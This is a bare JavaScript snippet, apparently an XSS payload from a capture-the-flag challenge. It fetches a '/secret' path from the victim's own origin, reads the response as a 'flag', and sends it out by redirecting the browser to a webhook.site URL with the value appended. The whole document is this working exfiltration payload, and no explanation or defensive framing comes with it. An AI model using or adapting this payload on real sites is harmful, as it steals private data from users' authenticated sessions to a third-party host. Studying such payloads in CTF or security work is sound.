fetch("/secret")
  .then(data => data.text())
  .then(flag => {
    window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag=" + flag;
  })
  .catch(error => {
    console.error('There was a problem:', error);
  });
